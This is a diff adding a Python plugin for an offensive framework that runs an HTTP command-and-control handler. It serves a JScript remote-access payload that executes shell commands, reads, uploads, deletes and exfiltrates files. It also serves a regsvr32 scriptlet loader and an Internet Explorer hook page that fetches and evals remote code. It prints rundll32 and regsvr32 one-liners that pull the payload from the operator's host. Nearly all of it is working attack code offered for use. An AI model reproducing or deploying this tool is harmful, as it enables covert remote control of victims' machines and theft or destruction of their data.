@@ -1,0 +1,353 @@
+#!/usr/bin/env python3
+Description = 'rundll32,regsvr32,browser-hook invocation handler.'
+from pluginsupport import *
+import os, re, socket, SocketServer, sys, time
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import readline
+
+def malcode():
+  code_injection = """
+			while(true) {
+				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+				h.SetTimeouts(0, 0, 0, 0);
+                        	try {
+					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					h.Send();
+					c = h.ResponseText;
+                            		if(c=="delete") {
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Next Input should be the File to Delete]");
+                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		g.SetTimeouts(0, 0, 0, 0);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	g.Send();
+					    	d = g.ResponseText;
+                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
+                                		f =fso1.GetFile(d);
+                                		f.Delete();
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Delete Success]\\n");
+                                		continue;
+                            		} else if(c=="download") {
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Next Input should be the File to download]");
+                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		g.SetTimeouts(0, 0, 0, 0);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	g.Send();
+					    	d = g.ResponseText;
+                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
+                                		f=fso1.OpenTextFile(d,1);
+                                		g=f.ReadAll();
+                                		f.Close();
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/download",false);
+					    	p.Send(g);
+                                		continue;
+                          		} else if(c=="read") {
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Next Input should be the File to Read]");
+                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		g.SetTimeouts(0, 0, 0, 0);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	g.Send();
+					    	d = g.ResponseText;
+                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
+                                		f=fso1.OpenTextFile(d,1);
+                                		g=f.ReadAll();
+                                		f.Close();
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send(g + "\\n");
+                                		continue;
+                            		} else if(c=="run") {
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Next Input should be the File to Run]");
+                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		g.SetTimeouts(0, 0, 0, 0);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	g.Send();
+					    	d = g.ResponseText;
+                                		r = new ActiveXObject("WScript.Shell").Run(d,0,true);
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+                                		p.Send("[Run Success]\\n");
+                                		continue;
+                            		} else if(c=="upload") {
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                        		 	p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Start to Upload]");
+                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		g.SetTimeouts(0, 0, 0, 0);
+                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/uploadpath",false);
+					    	g.Send();
+					    	dpath = g.ResponseText;
+                                		g2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		g2.SetTimeouts(0, 0, 0, 0);
+                                		g2.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/uploaddata",false);
+					    	g2.Send();
+					    	ddata = g2.ResponseText;
+                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
+                                		f=fso1.CreateTextFile(dpath,true);
+                                		f.WriteLine(ddata);
+                                		f.Close();
+                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                                		p.SetTimeouts(0, 0, 0, 0);
+					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+					    	p.Send("[Upload Success]\\n");
+                                		continue;
+                            		} else {
+                            			r = new ActiveXObject("WScript.Shell").Exec(c);
+				    		var so;
+				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
+						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+				    		p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+			 	       		p.Send(so + "\\n");
+                            		}
+                        	} catch(e1) {
+                            		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                            		p.SetTimeouts(0, 0, 0, 0);
+					p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
+                            		p.Send("[ERROR - No Output]\\n");
+				}
+			}
+		"""
+  return code_injection
+
+
+def code_regsrv():
+  regsrv_inject = '<?XML version="1.0"?>\n';
+  regsrv_inject += "  <scriptlet>\n";
+  regsrv_inject += "    <registration \n";
+  regsrv_inject += '      progid="Bangarang"\n';
+  regsrv_inject += '      version="1.01"\n';
+  regsrv_inject += '      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >\n';
+  regsrv_inject += '      <script language="JScript">\n';
+  regsrv_inject += '        <![CDATA[\n\n';
+  regsrv_inject += malcode();
+  regsrv_inject += '        ]]>\n';
+  regsrv_inject += "      </script>\n";
+  regsrv_inject += "    </registration>\n";
+  regsrv_inject += "  </scriptlet>"
+  return regsrv_inject
+
+
+def help_menu():
+    print("\n")
+    print("Core Commands")
+    print("=============")
+    print("")
+    print("  Command         Description")
+    print("  -------         -----------")
+    print("  help            Help Menu.")
+    print("  cmd             Executes Provided Command.")
+    print("  run             Run EXE or Script.")
+    print("  read            Read File.")
+    print("  upload          Upload File.")
+    print("  delete          Delete File.")
+    print("  exit            Exit Shell.")
+    print("")
+
+
+def get_user_input():
+  try:
+    while True:
+      usr_input = raw_input("handler > ");
+      if usr_input.strip() != "":
+        break
+      else:
+        print("")
+  except KeyboardInterrupt:
+    sys.exit();
+  return usr_input.strip();
+
+
+class myHandler(BaseHTTPRequestHandler):
+  js_load_path = '/connect'   # Base URL path to initialize rundll32 client (value is overridden at server start)
+  sct_load_path = '/file.sct' # Base URL path to initialize regsvr32 client (value is overridden at server start)
+  upload_path = "";           # static so we can set/get as needed, since this isnt powershell...
+  time_to_stop = False;
+
+  def log_message(self, format, *args):
+    """ Custom Log Handler to Spit out on to stderr """
+    return
+
+  def do_GET(self):
+    """
+        Handle any GET requests coming into our server
+    """
+    content_type = "text/plain";
+    response_message = malcode();
+    if self.js_load_path == self.path:
+      # invoked via rrundll32 method
+      time.sleep(0.8)
+      succ = "Incoming rundll32 Invoked Client: %s" % str(self.client_address[0])
+      success(succ)
+      time.sleep(0.8)
+      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
+        ua = "User-Agent: %s" % self.headers['User-Agent']
+        success(ua)
+      help_menu();
+
+    elif self.sct_load_path == self.path:
+      global client_type
+      client_type = 2; # invoked via regsvr32 method
+      response_message = code_regsrv()
+      time.sleep(0.8)
+      good = "Incoming regsvr32 Invoked Client: %s" % str(self.client_address[0])
+      success(good)
+      time.sleep(0.8)
+      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
+        ua = "User-Agent: %s" % self.headers['User-Agent']
+        success(ua)
+        time.sleep(0.8)
+      help_menu();
+
+    elif "/rat" == self.path:
+      # Get input from server operator on what to do next...
+      response_message = get_user_input();
+      if response_message.strip().lower() == "help":
+        help_menu()
+        while True:
+          response_message = get_user_input();
+          if response_message.strip().lower() != "help":
+            break
+          else:
+            print("")
+      elif response_message.strip().lower() == "ps":
+        global client_type
+        if client_type == 1:
+          response_message = "cmd.exe /c TASKLIST"
+      elif response_message.strip().lower() == "exit":
+        global client_type
+        if client_type == 1:
+          fail("Killing session...")
+          response_message = "cmd.exe /c taskkill /f /im rundll32.exe";
+        else:
+          fail("Killing session...")
+          response_message = "cmd.exe /c taskkill /f /im regsvr32.exe";
+        warning("Hit CTRL+C to kill server....")
+
+    elif "/uploadpath" == self.path:
+      lpath = raw_input("Upload file: ")
+      myHandler.upload_path = lpath
+      print("Setting local upload path to: %s" % myHandler.upload_path)
+      destination_path = raw_input("Remote Path: ")
+      response_message = destination_path.strip()
+
+    elif "/uploaddata" == self.path:
+      response_message = open(myHandler.upload_path, 'rb+').read()
+      myHandler.upload_path = "";
+
+    elif "/hook" == self.path:
+      dada = "Hooking Client: %s" % str(self.client_address[0])
+      success(dada)
+      content_type = "text/html"
+      response_message = malcode()
+      response_message = """<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+  <head>
+   <title> new document </title>
+   <meta name="generator" content="editplus">
+   <meta name="author" content="">
+   <meta name="keywords" content="">
+   <meta name="description" content="">
+  </head>
+  <body>
+   <script language="javascript" type="text/javascript">
+      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+      h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);
+      h.Send();
+      B=h.ResponseText;
+      eval(B);
+    </script>
+  </body>
+</html>"""
+
+    elif "/wtf" == self.path:
+      print("Client Command Query from: %s" % str(self.client_address[0]))
+      response_message = """
+rundll32 Method for Client Invocation:
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+
+regsvr32 Method for Client Invocation:
+regsvr32.exe /u /n /s /i:http://"""+bind_ip+":"+str(listener_port)+srv_sct+""" scrobj.dll
+"""
+      print(response_message + "\n")
+
+    # Send the built response back to client
+    self.send_response(200);
+    self.send_header('Content-type',content_type);
+    self.end_headers();
+    self.wfile.write(response_message);
+
+
+  def do_POST(self):
+    """
+        Handle any POST requests coming into our server
+    """
+    if "/rat" == self.path:
+      content_len = int(self.headers.getheader('content-length', 0))
+      post_body = self.rfile.read(content_len)
+      print post_body
+      if post_body == "[No Output]":
+        print
+      self.send_response(200);
+      self.send_header('Content-type','text/plain');
+      self.end_headers();
+    else:
+      print("%s - detected..." % str(self.client_address[0]))
+      print("=> %s" % self.path)
+      self.send_error(404);
+
+
+def main():
+  try:
+    global httpd;
+    myHandler.js_load_path = srv_url;
+    httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler)
+    text1 = "rundll32 invocation: http://%s:%s%s" % (bind_ip, listener_port, srv_url)
+    time.sleep(0.8)
+    text2 = "regsvr32 invocation: http://%s:%s%s" % (bind_ip, listener_port, srv_sct)
+    time.sleep(0.8)
+    text3 = "Browser Hook Set at ('Internet Explorer'): http://%s:%s/hook" % (bind_ip, listener_port)
+    warning(text1)
+    warning(text2)
+    warning(text3)
+    success("Starting the payload handler...")
+    httpd.serve_forever();
+  except socket.error, e:
+    print 'Socket Error:\n\t%s\n' % e
+  except KeyboardInterrupt:
+    warning("Shutting Down Web Server...")
+    httpd.shutdown;
+
+bind_ip = ask.LHOST;
+listener_port = int(ask.LPORT)
+
+
+global client_type;
+client_type=1
+srv_url = ask.urlpath
+srv_sct = ask.urlpath + ".sct"
+
+if __name__ == "__main__":
+  try:
+    main()
+
+  except KeyboardInterrupt:
+    sys.exit()
